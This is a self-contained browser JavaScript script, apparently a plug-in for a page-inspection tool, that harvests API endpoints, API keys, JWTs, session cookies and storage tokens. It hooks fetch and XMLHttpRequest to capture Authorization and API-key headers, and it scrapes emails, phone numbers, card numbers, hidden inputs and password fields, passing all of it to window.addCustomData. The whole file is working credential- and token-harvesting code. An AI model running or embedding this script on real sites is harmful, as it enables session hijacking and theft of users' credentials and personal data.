// Name: Comprehensive Data Harvester
// Description: Combines API discovery, authentication token extraction, and sensitive data scanning into one efficient script

(function() {
  const harvestedData = {
    apis: {
      endpoints: new Set(),
      graphql: new Set(),
      websockets: new Set(),
      apiKeys: []
    },
    auth: {
      jwts: [],
      sessions: [],
      authHeaders: []
    },
    sensitive: {
      emails: new Set(),
      phones: new Set(),
      cards: [],
      tokens: [],
      passwords: []
    },
    technical: {
      hiddenInputs: [],
      dataAttributes: [],
      metadata: {}
    }
  };

  // === API Discovery ===
  function discoverAPIs() {
    // Check scripts for API patterns
    document.querySelectorAll('script').forEach(script => {
      const content = script.textContent || script.innerHTML || '';

      // API endpoints
      const apiPatterns = [
        /["'](\/api\/[^"']+)["']/gi,
        /["'](https?:\/\/[^"']*\/api[^"']+)["']/gi,
        /fetch\s*\(\s*["']([^"']+)["']/gi,
        /axios\.[get|post|put|delete]+\s*\(\s*["']([^"']+)["']/gi
      ];

      apiPatterns.forEach(pattern => {
        const matches = content.matchAll(pattern);
        for (const match of matches) {
          if (match[1]) harvestedData.apis.endpoints.add(match[1]);
        }
      });

      // GraphQL
      if (content.includes('graphql') || content.includes('GraphQL')) {
        const graphqlPattern = /["'](https?:\/\/[^"']*graphql[^"']+)["']/gi;
        const matches = content.matchAll(graphqlPattern);
        for (const match of matches) {
          if (match[1]) harvestedData.apis.graphql.add(match[1]);
        }
      }

      // WebSocket
      const wsPattern = /wss?:\/\/[^"'\s]+/gi;
      const wsMatches = content.matchAll(wsPattern);
      for (const match of wsMatches) {
        harvestedData.apis.websockets.add(match[0]);
      }

      // API Keys
      const keyPatterns = [
        /["'](sk_[a-zA-Z0-9]{32,})["']/g,
        /["'](pk_[a-zA-Z0-9]{32,})["']/g,
        /["']([a-zA-Z0-9]{32,64})["'].*["']api[_-]?key["']/gi,
        /["']api[_-]?key["'].*["']([a-zA-Z0-9]{32,64})["']/gi,
        /["'](AIza[a-zA-Z0-9_-]{35})["']/g,
        /["']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["']/gi
      ];

      keyPatterns.forEach(pattern => {
        const matches = content.matchAll(pattern);
        for (const match of matches) {
          if (match[1] && match[1].length > 20) {
            harvestedData.apis.apiKeys.push({
              key: match[1].substring(0, 50),
              context: match[0].substring(0, 100)
            });
          }
        }
      });
    });

    // Check window object
    for (const key in window) {
      try {
        if (key.toLowerCase().includes('api') || key.toLowerCase().includes('endpoint')) {
          const value = window[key];
          if (typeof value === 'string' && value.includes('/')) {
            harvestedData.apis.endpoints.add(value);
          } else if (typeof value === 'object' && value !== null) {
            harvestedData.technical.metadata[key] = JSON.stringify(value).substring(0, 200);
          }
        }
      } catch (e) {}
    }
  }

  // === Authentication Harvesting ===
  function harvestAuthentication() {
    // Check localStorage
    for (let i = 0; i < localStorage.length; i++) {
      try {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);

        // JWT tokens
        if (value && (value.startsWith('eyJ') || key.toLowerCase().includes('token'))) {
          const parts = value.split('.');
          if (parts.length === 3) {
            try {
              const payload = JSON.parse(atob(parts[1]));
              harvestedData.auth.jwts.push({
                key: key,
                payload: payload,
                raw: value.substring(0, 100) + '...'
              });
            } catch (e) {
              if (key.toLowerCase().includes('token')) {
                harvestedData.auth.jwts.push({
                  key: key,
                  value: value.substring(0, 100)
                });
              }
            }
          }
        }

        // Session IDs
        if (key.toLowerCase().includes('session') || key.toLowerCase().includes('sid')) {
          harvestedData.auth.sessions.push({
            key: key,
            value: value.substring(0, 100)
          });
        }
      } catch (e) {}
    }

    // Check sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
      try {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);

        if (value && (value.startsWith('eyJ') || key.toLowerCase().includes('token'))) {
          const parts = value.split('.');
          if (parts.length === 3) {
            harvestedData.auth.jwts.push({
              storage: 'session',
              key: key,
              value: value.substring(0, 100) + '...'
            });
          }
        }
      } catch (e) {}
    }

    // Check cookies
    document.cookie.split(';').forEach(cookie => {
      const [name, value] = cookie.trim().split('=');
      if (name && value) {
        if (name.toLowerCase().includes('session') || name.toLowerCase().includes('sid') || name.toLowerCase().includes('auth')) {
          harvestedData.auth.sessions.push({
            cookie: name,
            value: value.substring(0, 50)
          });
        }
        if (value.startsWith('eyJ')) {
          harvestedData.auth.jwts.push({
            cookie: name,
            value: value.substring(0, 100) + '...'
          });
        }
      }
    });
  }

  // === Sensitive Data Scanning ===
  function scanSensitiveData() {
    const bodyText = document.body.innerText || document.body.textContent || '';

    // Emails
    const emailPattern = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
    const emails = bodyText.match(emailPattern) || [];
    emails.forEach(email => harvestedData.sensitive.emails.add(email));

    // Phone numbers
    const phonePatterns = [
      /\+?1?\s*\(?[0-9]{3}\)?[\s.-]?[0-9]{3}[\s.-]?[0-9]{4}/g,
      /\+[0-9]{1,3}[\s.-]?[0-9]{6,14}/g
    ];
    phonePatterns.forEach(pattern => {
      const phones = bodyText.match(pattern) || [];
      phones.forEach(phone => harvestedData.sensitive.phones.add(phone));
    });

    // Credit cards
    const cardPattern = /\b(?:\d[ -]*?){13,19}\b/g;
    const potentialCards = bodyText.match(cardPattern) || [];
    potentialCards.forEach(card => {
      const cleaned = card.replace(/[\s-]/g, '');
      if (cleaned.length >= 13 && cleaned.length <= 19) {
        harvestedData.sensitive.cards.push(card.substring(0, 8) + '****' + card.slice(-4));
      }
    });

    // JWT tokens in page
    const jwtPattern = /eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g;
    const jwts = bodyText.match(jwtPattern) || [];
    jwts.forEach(jwt => {
      harvestedData.sensitive.tokens.push(jwt.substring(0, 50) + '...');
    });

    // API keys in page
    const apiKeyPatterns = [
      /sk_[a-zA-Z0-9]{32,}/g,
      /pk_[a-zA-Z0-9]{32,}/g,
      /AIza[a-zA-Z0-9_-]{35}/g
    ];
    apiKeyPatterns.forEach(pattern => {
      const keys = bodyText.match(pattern) || [];
      keys.forEach(key => {
        harvestedData.sensitive.tokens.push(key.substring(0, 30) + '...');
      });
    });

    // Hidden inputs
    document.querySelectorAll('input[type="hidden"]').forEach(input => {
      if (input.value) {
        harvestedData.technical.hiddenInputs.push({
          name: input.name || input.id,
          value: input.value.substring(0, 100)
        });
      }
    });

    // Password fields with values
    document.querySelectorAll('input[type="password"]').forEach(input => {
      if (input.value) {
        harvestedData.sensitive.passwords.push({
          field: input.name || input.id || 'unknown',
          length: input.value.length,
          filled: true
        });
      }
    });

    // Data attributes
    document.querySelectorAll('[data-user-id], [data-api-key], [data-token], [data-session]').forEach(el => {
      Array.from(el.attributes).forEach(attr => {
        if (attr.name.startsWith('data-')) {
          harvestedData.technical.dataAttributes.push({
            name: attr.name,
            value: attr.value.substring(0, 100)
          });
        }
      });
    });
  }

  // === Network Interception ===
  function interceptNetwork() {
    // Intercept fetch
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
      const [url, options = {}] = args;

      // Log the endpoint
      if (typeof url === 'string') {
        harvestedData.apis.endpoints.add(url);

        // Check for auth headers
        if (options.headers) {
          const headers = options.headers;
          if (headers.Authorization || headers.authorization) {
            harvestedData.auth.authHeaders.push({
              url: url,
              auth: (headers.Authorization || headers.authorization).substring(0, 50)
            });
          }
          if (headers['X-API-Key'] || headers['x-api-key']) {
            harvestedData.apis.apiKeys.push({
              url: url,
              key: (headers['X-API-Key'] || headers['x-api-key']).substring(0, 50)
            });
          }
        }
      }

      return originalFetch.apply(this, args);
    };

    // Intercept XMLHttpRequest
    const originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
      harvestedData.apis.endpoints.add(url);
      return originalOpen.apply(this, arguments);
    };

    const originalSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
      if (header.toLowerCase() === 'authorization') {
        harvestedData.auth.authHeaders.push({
          header: header,
          value: value.substring(0, 50)
        });
      }
      return originalSetRequestHeader.apply(this, arguments);
    };
  }

  // === Execute all collection ===
  try {
    interceptNetwork();
    discoverAPIs();
    harvestAuthentication();
    scanSensitiveData();

    // Clean up and prepare data
    const finalData = {
      apis: {
        endpoints: Array.from(harvestedData.apis.endpoints).slice(0, 50),
        graphql: Array.from(harvestedData.apis.graphql),
        websockets: Array.from(harvestedData.apis.websockets),
        apiKeys: harvestedData.apis.apiKeys.slice(0, 20)
      },
      authentication: {
        jwts: harvestedData.auth.jwts.slice(0, 10),
        sessions: harvestedData.auth.sessions.slice(0, 10),
        authHeaders: harvestedData.auth.authHeaders.slice(0, 10)
      },
      sensitive: {
        emails: Array.from(harvestedData.sensitive.emails).slice(0, 20),
        phones: Array.from(harvestedData.sensitive.phones).slice(0, 10),
        cards: harvestedData.sensitive.cards.slice(0, 5),
        tokens: harvestedData.sensitive.tokens.slice(0, 10),
        passwordFields: harvestedData.sensitive.passwords
      },
      technical: {
        hiddenInputs: harvestedData.technical.hiddenInputs.slice(0, 20),
        dataAttributes: harvestedData.technical.dataAttributes.slice(0, 20),
        metadata: harvestedData.technical.metadata
      },
      summary: {
        totalEndpoints: harvestedData.apis.endpoints.size,
        totalEmails: harvestedData.sensitive.emails.size,
        totalTokens: harvestedData.auth.jwts.length,
        hasGraphQL: harvestedData.apis.graphql.size > 0,
        hasWebSocket: harvestedData.apis.websockets.size > 0,
        timestamp: new Date().toISOString()
      }
    };

    window.addCustomData({
      title: "Comprehensive Data Harvest",
      data: finalData
    });

  } catch (err) {
    window.addCustomData({
      title: "Data Harvest Error",
      data: {
        error: err.message,
        stack: err.stack
      }
    });
  }
})();